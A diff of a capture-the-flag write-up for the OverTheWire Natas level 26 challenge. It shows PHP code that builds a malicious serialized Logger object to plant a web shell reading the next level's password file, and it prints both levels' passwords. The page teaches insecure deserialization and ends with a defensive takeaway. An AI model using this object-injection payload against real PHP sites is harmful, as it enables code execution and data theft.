@@ -1,39 +1,59 @@
-# Natas Level 26 → Level 27
+<div style="font-family: 'Times New Roman', Times, serif; font-size: 12pt;">
+
+
+# OverTheWire Natas — Level 26
 
 ## Objective
-Retrieve the password by exploiting insecure object deserialization.
 
-## Environment
-- Web-based challenge (OverTheWire Natas)
-- Access via web browser
-- HTTP Basic Authentication
-- PHP backend
+Exploit an Insecure Deserialization vulnerability (PHP Object Injection) to execute arbitrary code and retrieve the password.
 
-## Challenge Overview
-The application stores user-related data inside a serialized object.  
-This object is sent to the client and later deserialized by the server.
+## Access
 
-The server assumes the object data is trustworthy.
+* URL: http://natas26.natas.labs.overthewire.org/
+* Username: natas26
+* Password: u3RRffXjysjgwFU6b9xa23i6prmUsYne
 
-It is not.
+## Method
 
-## Approach
-Serialized objects can be modified before being sent back to the server.  
-By crafting a malicious serialized payload that manipulates object properties, server-side behavior can be altered.
+The application draws lines based on coordinates stored in a cookie named `drawing`. The source code reveals a `Logger` class designed to write log messages to a file upon the object's destruction (`__destruct()`).
 
-This allows writing arbitrary files to the server and executing code.
+The application uses `unserialize()` on the base64-encoded `drawing` cookie. Since the input is not sanitized, we can inject a malicious serialized object of the `Logger` class.
 
-## Steps Taken
-1. Open the Natas Level 26 webpage.
-2. Inspect the serialized object sent to the client.
-3. Analyze the object structure and properties.
-4. Modify the serialized data to write a malicious file.
-5. Send the modified object back to the server.
-6. Execute the uploaded file and extract the password.
-
-## Tools Used
-- Web Browser
-- Manual object serialization manipulation
+**Exploit Steps:**
+1.  **Analyze the Class:** The `Logger` class has properties `$logFile`, `$initMsg`, and `$exitMsg`. The `__destruct()` method writes `$exitMsg` to `$logFile`.
+2.  **Craft the Payload:** Write a local PHP script to generate the malicious object:
+    ```php
+    class Logger {
+        private $logFile;
+        private $initMsg;
+        private $exitMsg;
+      
+        function __construct($file, $msg) {
+            $this->logFile = $file;
+            $this->exitMsg = $msg;
+            $this->initMsg = ""; // Empty to keep it clean
+        }
+    }
+    
+    // Target file: Web accessible directory
+    // Payload: Read the password file
+    $o = new Logger("img/shell.php", "<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>");
+    echo base64_encode(serialize($o));
+    ```
+3.  **Inject:** Take the generated base64 string and set it as the value of the `drawing` cookie in the browser.
+4.  **Execute:** Refresh the page. The application deserializes the object. When the script ends, `__destruct()` triggers, writing the PHP shell to `img/shell.php`.
+5.  **Retrieve:** Navigate to `http://natas26.natas.labs.overthewire.org/img/shell.php` to view the flag.
 
 ## Result
-The password for **Natas Level 27** was successfully retrieved via insecure object deserialization.
+
+Password for the next level obtained successfully.
+
+55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
+
+
+## Key Takeaway
+
+* **Insecure Deserialization** occurs when user-controlled data is passed to `unserialize()`.
+* Attackers can manipulate object properties to trigger "gadget chains" (code defined in magic methods like `__destruct`, `__wakeup`, or `__toString`) to execute arbitrary actions.
+* Never unserialize data from untrusted sources; use JSON instead.
+</div>
